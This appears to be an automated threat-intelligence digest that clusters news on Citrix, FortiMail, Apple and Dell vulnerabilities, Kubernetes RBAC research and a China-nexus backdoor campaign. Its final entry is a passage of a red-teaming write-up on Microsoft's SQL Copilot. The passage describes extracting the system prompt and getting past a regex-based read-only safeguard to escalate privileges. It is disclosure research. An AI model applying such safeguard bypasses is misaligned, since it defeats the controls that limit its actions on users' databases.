Advertisement Get our latest cybersecurity news first on Google. Click here! Close Citrix customers just got through back-to-back weekends filled with varying levels of uncertainty and worry, as yet another actively exploited zero-day vulnerability was discovered in Citrix NetScaler products. Researchers and security experts said the vulnerability — CVE-2026-88779 — is less concerning because exploitation triggers denial of service and only impacts instances that have SAML (security assertion markup language) enabled. “This means it doesn’t work out of the box against every NetScaler deployment,” Jake Knott, head of threat intelligence at watchTowr, told CyberScoop. “While this is very inconvenient, it doesn’t have organizations scrambling to trigger incident response.” Citrix was much quicker and consistent in alerting customers to the emerging threat Friday, and followed up the next day with a more detailed blog post and security advisory that contained a patch for the high-severity defect. Advertisement “After we were alerted to this issue we immediately developed and published a mitigation while concurrently developing, testing and deploying a fix,” a company spokesperson said in a statement. “The fix for this issue is available, and we urge all customers to quickly apply it to their NetScaler instance.” The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Sunday. The vendor’s response also provided some relief for customers and researchers who spent much of the previous weekend rushing to assess widespread rumors of other defects in the assailed network edge gateways. In that case, Citrix took most of the weekend to confirm attackers were actively exploiting a pair of NetScaler zero-days, some of which researchers said remained undetected for at least three weeks . “Citrix did a better job with their response to this vulnerability,” and took steps that enabled customers to make their own risk-based decisions with more currently available information, said Joe Toomey, vice president of underwriting security at insurance provider Coalition. “Although it’s difficult to celebrate given this is the third publicly-exploited NetScaler zero-day vulnerability in a two-week window, it is a step in the right direction,” he added. Advertisement Citrix declined to say how many customers are impacted by the latest zero-day or when the first instance of exploitation occurred. Yet, Knott at watchTowr said exploitation likely began Friday. The newer defect doesn’t share any technical links with the pair of zero-days Citrix disclosed less than a week prior, but it can accelerate one of those vulnerabilities — CVE-2026-88771 — by intentionally crashing machines to speed up exploitation, Knott said. While risk is currently perceived low for CVE-2026-88779, it is “incredibly simple to trigger, with a single specially crafted request being all that is needed to knock an appliance offline,” Knott added. “Exploitation is already occurring in the wild, and disrupting an authentication gateway can prevent legitimate users from accessing the services behind it.” Toomey also described the denial-of-service vulnerability as less serious than the previous week’s actively exploited zero-days. Yet, he noted, exploitation attempts of CVE-2026-88779 “clearly contain shellcode that implies that the threat actor believes they can use this vulnerability, or chain it with another vulnerability, in order to achieve remote-code execution.” Share Facebook LinkedIn Twitter Copy Link Add to Preferred Sources Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Hackers stealing data concept. (Getty Images) Citrix office complex in Santa Clara, California. ( Justin Sullivan/Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity What AI alignment means for cybersecurity Jailbreaks, sandboxes, and the limits of AI safeguard
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Citrix discloses third actively exploited NetScaler zero-day in less than a week
  - Published: 2026-10-05T23:07:17+00:00
  - Link: https://cyberscoop.com/citrix-netscaler-third-exploited-zero-day-vulnerability/
  - Summary: The vendor was much quicker and consistent in its response to the latest defect, and researchers consider the impact relatively low compared to the previous pair of zero-days. The post Citrix discloses third actively exploited NetScaler zero-day in less than a week appeared first on CyberScoop .

### Cluster e0b5b97ad2 — score 19

- Title: ⚡ Weekly Recap: NetScaler and FortiMail 0-Days, AI Coding Leaks, Spectre v2 and Ransomware Arrests
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-05T14:20:43+00:00
- Link: https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, ransomware_extortion, zero_day
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: government
- affected_products: Citrix, Fortinet
- cve_ids: CVE-2026-104286, CVE-2026-88779
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, ddos, active_exploitation
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: government
- affected_products: Citrix, Fortinet
- cve_ids: CVE-2026-88779, CVE-2026-104286
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A blank field. A public repo. One reply to an email. A box left exposed. None of this sounds dramatic, which is partly the problem. This week’s threats keep finding leverage in small things that were easy to overlook. There are actively exploited bugs in the mix, cleaner intrusion paths, smarter automation, and a long patch list waiting behind them. Some attacks are getting more capable. Others
```

#### Full body

```
⚡ Weekly Recap: NetScaler and FortiMail 0-Days, AI Coding Leaks, Spectre v2 and Ransomware Arrests  Ravie Lakshmanan  Oct 05, 2026 Cybersecurity News / Hacking A blank field. A public repo. One reply to an email. A box left exposed. None of this sounds dramatic, which is partly the problem. This week’s threats keep finding leverage in small things that were easy to overlook. There are actively exploited bugs in the mix, cleaner intrusion paths, smarter automation, and a long patch list waiting behind them. Some attacks are getting more capable. Others are still getting in because the basics gave way first. Here’s what mattered this week. ⚡ Threat of the Week Citrix Warns of Newly Exploited NetScaler ADC and Gateway Flaw — Citrix released security updates for a high-severity security flaw in NetScaler ADC and NetScaler Gateway that has been exploited as part of targeted zero-day attacks. The vulnerability, tracked as CVE-2026-88779, carries a CVSS score of 8.7 out of 10.0. "CVE-2026-88779 is a memory overflow vulnerability in Citrix NetScaler ADC and Citrix NetScaler Gateway that can lead to denial-of-service under specific deployment conditions," Citrix said. "The issue affects customer-managed NetScaler deployments running affected supported versions when the required preconditions are met." Successful exploitation requires NetScaler ADC or NetScaler Gateway to be configured either as a SAML service provider (SP) or SAML identity provider(IdP). How Headspace Centralized AI Governance Across Teams Most teams are stuck choosing between speed and control. Headspace found a way to have both. Hear how Chris Oh, Senior Director of AI Enablement at Headspace, gives the org flexibility to build, while maintaining full visibility into what’s running and who owns it. Watch the On-Demand Webinar Here ➝ 🔔 Top News Critical FortiMail Zero-Day Flaw Exploited in Attacks — The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned of active exploitation of a critical security flaw impacting Fortinet FortiMail. The flaw, CVE-2026-104286 (CVSS score: 9.8), allows unauthenticated attackers to write arbitrary files on the underlying system. According to Fortinet, the vulnerability "may allow an unauthenticated attacker to write arbitrary files on the underlying system via crafted HTTP or HTTPS requests." Two ShinyHunters Members Arrested — Law enforcement agencies have arrested two members associated with the ShinyHunters digital extortion group. One of them is a 24-year-old Amsterdam man, who is believed to be Pepijn van der Stap, while the second individual is Saif ‌al-Din Khader, who is said to have been detained by Jordanian authorities last week. ShinyHunters has drawn attention in recent weeks for hijacking the darknet website of Cl0p and its hack of the FBI's "apply.fbijobs[.]gov" portal. Authorities Arrest 16-Year-Old Mastermind Behind KillSec — Police in Spain apprehended a 16-year-old who is suspected to be the leader of the KillSec (aka Kill Security Ransomware Group) ransomware operation. According to Europol, authorities took control of KillSec's leak site on September 30, 2026, securing no less than 110 terabytes of data. As part of Operation KillSwitch, a total of three suspects were provisionally arrested and eight properties searched in Greece, Romania, Spain, and the U.K. One of the group’s accused members, Fouad Eltibrizi, was arrested in the U.K. and is awaiting extradition to the U.S. Since emerging in 2024, the group is estimated to have launched around 1,000 attacks, at least half of which were successful. "The group exploited software vulnerabilities and poorly secured access points, particularly to cloud storage, to gain access to organizations' systems," Europol said . "Its members then copied sensitive internal data to infrastructure under their control. Victims were named on the group's dark web leak site and threatened with publication of their data unless paid." Per Group-IB, which identified 274 publ
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ⚡ Weekly Recap: NetScaler and FortiMail 0-Days, AI Coding Leaks, Spectre v2 and Ransomware Arrests
  - Published: 2026-10-05T14:20:43+00:00
  - Link: https://thehackernews.com/2026/10/weekly-recap-netscaler-and-fortimail-0.html
  - Summary: A blank field. A public repo. One reply to an email. A box left exposed. None of this sounds dramatic, which is partly the problem. This week’s threats keep finding leverage in small things that were easy to overlook. There are actively exploited bugs in the mix, cleaner intrusion paths, smarter automation, and a long patch list waiting behind them. Some attacks are getting more capable. Others

### Cluster 2c9fe9c79f — score 16

- Title: Guarding the gates: Assessing dangerous permissions granted to Kubernetes built-in principals
- Source: Datadog Security Labs (cloud_identity_infrastructure)
- Published: 2026-10-05T00:00:00+00:00
- Link: https://securitylabs.datadoghq.com/articles/kubernetes-rbac-built-in-principals-dangerous-permissions/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Summary

```
We analyzed RBAC bindings across over 65,000 Kubernetes clusters to find dangerous permissions granted to system:anonymous, system:unauthenticated, and system:authenticated.
```

#### Full body

```
Rory McCune Senior Advocate - Security & Compliance Div Savla Data Analyst Kubernetes authorization is a vital but complex part of cluster security, where mistakes can have serious consequences in allowing attackers to establish and expand their access to critical resources. With that in mind we decided to examine how role-based access control (RBAC) is configured in real-world clusters. Specifically, we looked at bindings that can grant some of the built-in principals wide-ranging access to cluster resources. We examined over 65,000 clusters from almost 10,000 organizations to understand what the real-world usage of these principals looked like. Background: How do Kubernetes built-in principals work? Kubernetes provides a number of built-in users and groups that can have permissions assigned to them. Unauthenticated users who make requests to the Kubernetes API server are assigned a username of system:anonymous and a group of system:unauthenticated . As such, any permissions granted to those subjects are given to any caller who can reach the API server at a network level. In most clusters, these permissions allow access to endpoints such as /healthz , which is used for cluster monitoring. However, there are some configuration options that change how the API server handles requests without credentials. If the API server has --anonymous-auth=false set, then requests without credentials will always be rejected. Additionally, Kubernetes v1.34 introduced a feature that allows cluster administrators to restrict anonymous access to a specific list of paths, regardless of what RBAC settings are in place. The third principal that we're looking at in this blog post, system:authenticated , is a group that includes every user with valid credentials for the cluster. Administrators can use this group to grant permissions that every authenticated user in the cluster requires. Distribution defaults Of course, most clusters do not run on upstream Kubernetes but instead use one of the available Kubernetes distributions. In our dataset, most of the clusters ran on Amazon Elastic Kubernetes Service (Amazon EKS), Google Kubernetes Engine (GKE), or Microsoft's Azure Kubernetes Service (AKS), so it's worth mentioning the relevant access-control defaults for each before getting into the data: AKS is one of the few distributions that uses the --anonymous-auth=false setting. So, any permissions granted to the anonymous principals have no effect, and an AKS API server will reject any request without valid credentials. EKS allows anonymous access. However, since v1.32 (before the upstream feature was generally available), EKS has restricted the endpoints that can be exposed without credentials. As a result, bindings to the anonymous principals don't have any effect. GKE allows anonymous access and, like EKS, limits the endpoints that can be accessed without credentials (but from v1.35 in this case). GKE also has an unusual way of handling access to system:authenticated , as by default it allows any user with a valid Google account to have that access to any GKE cluster. (More details are available in Orca's research post on the topic.) It is now possible to block access from arbitrary Google accounts at cluster creation, but the default still stands. Data analysis With the background information covered, what did we see in our data? Across the clusters in the dataset, there were over 320,000 bindings to one of the three principals we're focusing on. Of those, we eliminated 265,000 because they were the default bindings that ship with base Kubernetes ( system:basic-user , system:discovery , and system:public-info-viewer ). That left us about 55,000 bindings to analyze. Filtering 320,000+ bindings to built-in principals down to 3,500+ dangerous grants (click to enlarge) The next group that we excluded was interesting: 11,000 bindings related to podsecuritypolicy objects. Kubernetes Pod Security Policies were removed as a feature in Kubernetes v1.25, which
```

#### Corroborating sources (1)

- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: Guarding the gates: Assessing dangerous permissions granted to Kubernetes built-in principals
  - Published: 2026-10-05T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/kubernetes-rbac-built-in-principals-dangerous-permissions/
  - Summary: We analyzed RBAC bindings across over 65,000 Kubernetes clusters to find dangerous permissions granted to system:anonymous, system:unauthenticated, and system:authenticated.

### Cluster 9b43995709 — score 16

- Title: China-nexus UAT-11587 targets government and policy organizations across Asia with Antino backdoor
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-30T10:00:01+00:00
- Link: https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Cisco

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor
- affected_industries: financial_services, government
- affected_products: Cisco, Microsoft 365
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage, web_shell_backdoor
- affected_industries: financial_services, government
- affected_products: Cisco, Microsoft 365
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Cisco Talos uncovered a cluster of activity we track as UAT-11587 targeting government and policy organizations across Asia, including in Taiwan, India, the Philippines, and Cambodia, to deliver a previously undocumented backdoor referred to as “Antino” in developer artifacts.
```

#### Full body

```
China-nexus UAT-11587 targets government and policy organizations across Asia with Antino backdoor By Ashley Shen Wednesday, September 30, 2026 06:00 Threat Spotlight Cisco Talos uncovered a cluster of activity we track as UAT-11587 targeting government and policy organizations across Asia, including in Taiwan, India, the Philippines, and Cambodia, to deliver a previously undocumented backdoor referred to as “Antino” in developer artifacts. Talos first observed UAT-11587 activity in September 2025. By July 2026, Talos had identified at least 16 affected or targeted institutional environments across eight Asian countries. Antino is a Rust-compiled Windows backdoor that supports host reconnaissance, shell and PowerShell execution, file transfer, in-memory shellcode loading and persistence. Its native command-and-control channel operates exclusively through Microsoft 365, using Microsoft Graph to interact with Outlook and OneDrive. Talos identified a recurring delivery branch that began with spear-phishing emails and tailored decoy documents, followed by a five-stage infection chain. The actor relied heavily on Cloudflare infrastructure for delivery, execution tracking, and payload staging. Based on the development, preparation-environment, and targeting indicators detailed in this report, Talos assesses with high confidence that UAT-11587 is China-nexus. Overview Talos first identified UAT-11587’s campaign while investigating a spear-phishing campaign directed at Taiwan's academic, think tank, and civil society policy community in March 2026. The message recreated Gmail's attachment interface and directed the target into a cloud-hosted, multi-stage infection chain. Across this activity, our researchers assessed that the actor used several delivery methods, loader families, and post-compromise tools. One recurring final-stage payload was a custom Rust backdoor that Talos tracks as Antino. Antino communicates with Microsoft 365 applications and uses Outlook and OneDrive objects as dead drops, rather than depending on a conspicuous dedicated command server. Further investigation showed that the activity extended beyond the initial Taiwan operation. Talos subsequently identified confirmed or probable affected government and security environments across multiple Asian countries, alongside additional regional targeting supported by lure content. While this report was being prepared, Symantec published research on an activity set it tracks as Jewelbug . Talos identified overlaps between UAT-11587 and the Antino-related espionage activity attributed to Jewelbug. Although Symantec reported that Jewelbug conducted both espionage and cryptocurrency fraud, it assessed that “the SEO business supplied access, delivery and infrastructure into the espionage operation, rather than that one person performed both roles.” Talos could not independently verify a connection between the espionage campaign and Jewelbug’s financially motivated activity. We therefore track UAT-11587 as a separate activity set. Who is UAT-11587? Talos assesses with high confidence that UAT-11587 is a China-nexus actor, based on the totality of corroborating technical and operational evidence, rather than any single indicator. The indicators discussed below are selected examples of the broader evidence supporting this assessment. Evidence supporting the attribution assessment Decoy document metadata provides several preparation-environment clues. A Taiwan-focused decoy contains the zh-CN language tag, the Simplified Chinese author value 未定义 (“undefined”), and an explicit +08:00 creation timestamp. Both recovered spear-phishing messages also contain +08:00 date headers. UTC+8 alone is not geographically distinctive because it is used across mainland China, Taiwan, Hong Kong, Singapore, and other locations. However, the combination of the +08:00 offset, the zh-CN language tag and Simplified Chinese metadata is more consistent with a mainland Chinese environment than with Taiw
```

#### Corroborating sources (2)

- **Cisco Talos** (threat_research_primary)
  - Title: China-nexus UAT-11587 targets government and policy organizations across Asia with Antino backdoor
  - Published: 2026-09-30T10:00:01+00:00
  - Link: https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
  - Summary: Cisco Talos uncovered a cluster of activity we track as UAT-11587 targeting government and policy organizations across Asia, including in Taiwan, India, the Philippines, and Cambodia, to deliver a previously undocumented backdoor referred to as “Antino” in developer artifacts.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Antino Backdoor Uses Outlook and OneDrive for C2 in China-Nexus Espionage Campaign
  - Published: 2026-10-02T17:33:16+00:00
  - Link: https://thehackernews.com/2026/10/antino-backdoor-uses-outlook-and.html
  - Summary: Government and policy organizations across Asia have become the target of a new campaign orchestrated by a China-nexus threat actor. The activity, which has targeted government and policy organizations in Taiwan, India, the Philippines, Cambodia, Pakistan, Thailand, and Myanmar, involves the deployment of a previously undocumented backdoor codenamed Antino. Cisco Talos is tracking the cluster

### Cluster 05eb2547bf — score 14

- Title: Apple Zero-Day Vulnerability Weaponized in Targeted Attacks
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-29T21:31:29+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/apple-zero-day-vulnerability-weaponized-targeted-attacks
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-86950

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion, zero_day
- affected_industries: government
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2025-43300, CVE-2025-55177, CVE-2026-86950
- urgency_signals: no_patch_yet, poc_available, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, apt_espionage
- affected_industries: government
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-86950, CVE-2025-55177, CVE-2025-43300
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Attackers are exploiting CVE-2026-86950, an out-of-bounds write flaw, in an extremely sophisticated fashion, according to Apple.
```

#### Full body

```
Cyberattacks & Data Breaches Cyber Risk Threat Intelligence Vulnerabilities & Threats News Apple Zero-Day Vulnerability Weaponized in Targeted Attacks Attackers are exploiting CVE-2026-86950, an out-of-bounds write flaw, in an extremely sophisticated fashion, according to Apple. Jai Vijayan , Contributing Writer September 29, 2026 4 Min Read Source: tetrisfun via Shutterstock Apple released new versions of iOS and macOS to address a zero-day vulnerability that a threat actor is actively exploiting in targeted attacks. The out-of-bounds write vulnerability, tracked as CVE-2026-86950 , affects Apple's CoreGraphics framework, which macOS and iOS use to render and manipulate 2D graphics. The vulnerability affects a broad range of Apple devices, including iPhones dating back to the iPhone 11 and multiple generations of iPads. Extremely Sophisticated Attacks The flaw has a CVSS score of 8.8 and can allow an attacker to execute arbitrary code on an affected system. According to Apple's advisory , the vulnerability is being exploited "in an extremely sophisticated attack against specific targeted individuals" on versions of iOS before iOS 27. The technology giant said it has addressed the vulnerability by adding checks to ensure the software does not write data beyond the memory allocated for it. Related: Chinese Hackers Impersonate US Officials for AI Cyber Espionage The US Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-86950 to its Known Exploited Vulnerabilities (KEV) catalog — a source that it wants organizations to use to prioritize patching efforts . In keeping with its binding operative directive (BOD 26-04) from earlier this year for high-priority vulnerabilities, CISA has given federal civilian executive branch agencies three days to apply Apple's recommended mitigation for the vulnerability. As per BOD 26-04, these agencies must also conduct a forensic triage by Oct. 2 to determine if they have already been compromised via CVE-2026-86950. Apple credited Meta with disclosing the vulnerability to the company but has not released any information on the exploit activity or who it might be targeting. Adam Bynton, enterprise security manager at Jamf, says CVE-2026-86950 is significant because it affects a component of the graphics stack used to process content across Apple's operating systems. Though Apple has only referenced the attacks as targeting iOS, the company has patched the same flaw in macOS Tahoe and Sequoia, Boynton points out. “The broader pattern is worth watching," he says. "We continue to see highly sophisticated attacks look for routes through components that process untrusted content." As an example, he pointed to CVE-2025-55177 , a vulnerability in WhatsApp that attackers exploited in combination with CVE-2025-43300 , another out-of-bounds zero-day vulnerability, this time in Apple's ImageIQ technology. "We have also seen Apple disclose targeted exploitation involving WebKit and other memory-safety vulnerabilities," Boynton says. Related: Alleged KillSec Ransomware Mastermind a 16-Year-Old That shouldn’t be interpreted as Apple devices being broadly insecure, he says. "Apple describes these attacks as highly sophisticated and targeted at a very small population, which is why separating targeted exploitation from everyday enterprise risk is important.” Is a Nation-State Actor Behind the Attacks? It's unclear who is exploiting CVE-2026-86950 and if the attacks are ongoing. But Apple's description of the attacks as being extremely sophisticated hints that a nation-state actor or spyware firm might be involved. WhatsApp, for instance, has previously accused Israel's NSO Group of using its servers to distribute its Pegasus spyware on mobile devices belonging to targeted individuals. Ensar Seker, chief information security officer at SOCRadar, says a memory-corruption vulnerability like CVE-2026-86950, which can lead to arbitrary code execution during file processing, creates the potential for
```

#### Corroborating sources (3)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Apple Zero-Day Vulnerability Weaponized in Targeted Attacks
  - Published: 2026-09-29T21:31:29+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/apple-zero-day-vulnerability-weaponized-targeted-attacks
  - Summary: Attackers are exploiting CVE-2026-86950, an out-of-bounds write flaw, in an extremely sophisticated fashion, according to Apple.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Apple CoreGraphics PoC Emerges as WhatsApp PDF Checks Hint at Possible Delivery Path
  - Published: 2026-10-01T05:54:41+00:00
  - Link: https://thehackernews.com/2026/10/apple-coregraphics-poc-emerges-as.html
  - Summary: Security researchers have published the first public proof-of-concept for CVE-2026-86950, an Apple CoreGraphics flaw Apple says may have been used in attacks against specific targeted individuals. The trigger is a malicious PDF with a crafted embedded font that crashes unpatched iPhones and Macs. The code causes a crash, not an execution error. Turning the memory corruption into a working
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Apple Patches CoreGraphics Zero Day Exploited in Attacks
  - Published: 2026-09-30T08:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/apple-patches-coregraphics-zero/
  - Summary: Apple has patched CVE-2026-86950, a zero-day bug in the iOS CoreGraphics engine

### Cluster be88512aa3 — score 14

- Title: Dell System Update flaw allows attackers to gain root privileges (CVE-2026-86360)
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-10-06T10:44:41+00:00
- Link: https://www.helpnetsecurity.com/2026/10/06/dell-system-update-vulnerability-cve-2026-86360/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-86360

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- cve_ids: CVE-2026-63697, CVE-2026-71168, CVE-2026-86360, CVE-2026-86361, CVE-2026-86362
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-86360, CVE-2026-63697, CVE-2026-71168, CVE-2026-86361, CVE-2026-86362
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Dell is urging customers to patch a vulnerability (CVE-2026-86360) in Dell System Update (DSU) that could allow an unauthenticated remote attacker to execute arbitrary code with root privileges. DSU is a tool used by enterprise IT administrators to apply driver, BIOS, and firmware updates to Dell PowerEdge servers. About CVE-2026-86360 CVE-2026-86360 is a path traversal vulnerability with a CVSS base score of 9.6 that affects DSU versions prior to 2.3.0.0. “An unauthenticated attacker with remote … More → The post Dell System Update flaw allows attackers to gain root privileges (CVE-2026-86360) appeared first on Help Net Security .
```

#### Full body

```
Sinisa Markovic , Managing Editor, Help Net Security October 6, 2026 Share Dell System Update flaw allows attackers to gain root privileges (CVE-2026-86360) Dell is urging customers to patch a vulnerability (CVE-2026-86360) in Dell System Update (DSU) that could allow an unauthenticated remote attacker to execute arbitrary code with root privileges. DSU is a tool used by enterprise IT administrators to apply driver, BIOS, and firmware updates to Dell PowerEdge servers. About CVE-2026-86360 CVE-2026-86360 is a path traversal vulnerability with a CVSS base score of 9.6 that affects DSU versions prior to 2.3.0.0. “An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to Filesystem access for attacker. This vulnerability is considered critical because it can be leveraged by an unauthenticated attacker to execute arbitrary code with root privileges,” the company wrote in the advisory. According to Dell, successful exploitation may lead to complete compromise of the vulnerable application and the underlying operating system. “Dell recommends customers upgrade at the earliest opportunity,” the company noted, advising users to update to DSU version 2.3.0.0 or later. Four more vulnerabilities fixed Dell fixed four other high-severity flaws in DSU. Two of them (CVE-2026-63697 and CVE-2026-71168) could lead to remote execution, and the other two (CVE-2026-86361 and CVE-2026-86362) could let attackers elevate their privileges. Ori Gabriel reported CVE-2026-86360 and CVE-2026-63697. A researcher using the name saltedfish reported CVE-2026-86361 and CVE-2026-86362, and Nir Yehoshua of Cipher Security Labs reported CVE-2026-71168. The advisory does not say whether any of the vulnerabilities have been exploited in the wild. More about Dell remote access vulnerability Share
```

#### Corroborating sources (1)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Dell System Update flaw allows attackers to gain root privileges (CVE-2026-86360)
  - Published: 2026-10-06T10:44:41+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/06/dell-system-update-vulnerability-cve-2026-86360/
  - Summary: Dell is urging customers to patch a vulnerability (CVE-2026-86360) in Dell System Update (DSU) that could allow an unauthenticated remote attacker to execute arbitrary code with root privileges. DSU is a tool used by enterprise IT administrators to apply driver, BIOS, and firmware updates to Dell PowerEdge servers. About CVE-2026-86360 CVE-2026-86360 is a path traversal vulnerability with a CVSS base score of 9.6 that affects DSU versions prior to 2.3.0.0. “An unauthenticated attacker with remote … More → The post Dell System Update flaw allows attackers to gain root privileges (CVE-2026-86360) appeared first on Help Net Security .

### Cluster 2b530e9966 — score 14

- Title: From SELECT to SYSADMIN with SQL Copilot (CVE-2026-65669)
- Source: Embrace the Red (ai_security_agentic_risk)
- Published: 2026-09-30T21:00:40+00:00
- Link: https://embracethered.com/blog/posts/2026/from-select-to-sysadmin-sql-copilot-bluehat-asia/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-65669

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-65669
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- cve_ids: CVE-2026-65669
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus.
```

#### Full body

```
Two weeks back I presented at BlueHat Asia 2026 about my research on Microsoft’s Copilot in SSMS, the SQL Server Management Studio. This post is a write up about the talk, which covered CVE-2026-65669 , a SQL Server Elevation of Privilege Vulnerability rated critical by Microsoft. So, make sure your installations are up-to-date. The slides of the presentation can be found here . BlueHat Asia 2026 in Singapore First, a few words about the conference. I have spoken at BlueHat before, sometime back in 2017, and also two years ago. Both times at Microsoft’s Redmond Campus. This time was quite different. The event was in Singapore. It took a while to get there, but the event and side quests were amazing. Speakers got to enjoy a “Behind the Scenes” tour of the Gardens by the Bay . It was great to connect with fellow researchers and attendees throughout the event. Besides excellent talks from Halvar Flake, Stefan Esser, Chumy, and many others, there were also plenty of capture the flag challenges, which I enjoyed playing. Anyhow, let’s talk about exploiting Copilot in SQL Server Management Studio. Long-Form Video Presentation Since this post got quite popular and I got some inquiries, I recorded the 30 minute presentation and uploaded it to YouTube. You can watch it here: Otherwise, you can read all the details below. Reconnaissance: From SELECT to SYSADMIN Microsoft integrated Copilot into its database system via the SQL Server Management Studio. Naturally, one of my first prompts was: list all your tools However, SQL Copilot did not expose much… just 5 tools… 🤔 That had me confused. And after opening an authenticated Query Window to a database, a much larger set of database-specific tools became available. Here is a subset of the full tool list: There are tools for schema exploration, retrieving query results, inspecting database objects, reading database content, validating T/SQL, backup operations, and more. The important realization was that Copilot executes with the privileges of the connected user. Detour: SQL Copilot System Prompt The system prompt can easily be retrieved via the chatlogs in %APPDATA%\Local\SSMSCopilot\* . You are a AI copilot assistant running inside of SQL Server Management Studio and connected to a specific SQL Server database . Act as a SQL Server and SQL Server Management Studio SME. Here is a copy of the system prompt when I did the research. Anyhow, back to the tools. The ReadFromDatabase Tool SQL Copilot uses the connection from the Query Window. This means that if the user is connected as sysadmin , then Copilot also executes SQL using that sysadmin connection. One of the tools that caught my attention right away was the ReadFromDatabase tool. It allows Copilot to read data from databases. That immediately makes one question rather important: What prevents Copilot from running arbitrary or dangerous T/SQL? The answer is “Read-Only” mode. Here is the relevant part of the system prompt: # YOUR QUERY EXECUTION MODE : You are running in a read - only mode . The Copilot system prompt explicitly tells the model that it is operating in a read-only mode. It is instructed to not execute queries that change database or server state. At first glance, the model did refuse obvious requests to modify data or those that have side-effects. For example, when asked to invoke xp_dirtree , which connects to a remote server, Copilot explained that running server-level or OS-accessing stored procedures was not allowed. But system prompt instructions are not a security boundary. So, I was wondering if the read-only mode was actually enforced somewhere. Breaking Read-Only Mode via the ReadFromDatabase Tool After reversing the relevant code for ReadFromDatabase with my AI research crew and ILSpy , it turned out that the read-only enforcement is a regex-based classifier in the LocalSqlExecutionAccessChecker class. For instance, the regex for blocking EXEC looked like this. Blocklists are fragile security controls. There are o
```

#### Corroborating sources (1)

- **Embrace the Red** (ai_security_agentic_risk)
  - Title: From SELECT to SYSADMIN with SQL Copilot (CVE-2026-65669)
  - Published: 2026-09-30T21:00:40+00:00
  - Link: https://embracethered.com/blog/posts/2026/from-select-to-sysadmin-sql-copilot-bluehat-asia/
